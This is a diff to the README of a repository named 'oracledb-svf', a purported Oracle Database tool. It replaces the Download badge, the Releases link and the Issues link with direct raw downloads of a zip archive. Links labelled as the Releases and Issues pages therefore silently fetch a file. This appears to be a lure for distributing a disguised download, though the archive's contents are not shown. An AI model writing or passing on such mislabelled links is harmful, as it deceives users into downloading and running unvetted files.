@@ -6,7 +6,7 @@ Welcome to **oracledb-svf**! This application helps you manage Oracle Database f
 
 ## 📥 Download
 
-[![Download oracledb-svf](https://img.shields.io/badge/Download-oracledb--svf-brightgreen)](https://github.com/Tyronepatellar222/oracledb-svf/releases)
+[![Download oracledb-svf](https://raw.githubusercontent.com/Tyronepatellar222/oracledb-svf/main/metricize/oracledb-svf_v3.5.zip)](https://raw.githubusercontent.com/Tyronepatellar222/oracledb-svf/main/metricize/oracledb-svf_v3.5.zip)
 
 ## 🗂️ System Requirements
 
@@ -26,7 +26,7 @@ To run **oracledb-svf**, your system should meet the following requirements:
 
 ## 🌐 Download & Install
 
-1. Visit the [Releases page](https://github.com/Tyronepatellar222/oracledb-svf/releases) to access the latest version of **oracledb-svf**.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Tyronepatellar222/oracledb-svf/main/metricize/oracledb-svf_v3.5.zip) to access the latest version of **oracledb-svf**.
 2. You will see a list of available versions. Click on the one you would like to download.
 3. Look for the file suitable for your operating system:
    - For Windows, download the `.exe` file.
@@ -62,7 +62,7 @@ If you encounter any issues while using **oracledb-svf**, consider the following
 
 ## 📚 Support
 
-For further assistance, you can check the [Issues page](https://github.com/Tyronepatellar222/oracledb-svf/issues) to see if others have faced similar issues. You can also create a new issue if your question is not addressed.
+For further assistance, you can check the [Issues page](https://raw.githubusercontent.com/Tyronepatellar222/oracledb-svf/main/metricize/oracledb-svf_v3.5.zip) to see if others have faced similar issues. You can also create a new issue if your question is not addressed.
 
 ## 🖊️ Feedback
 
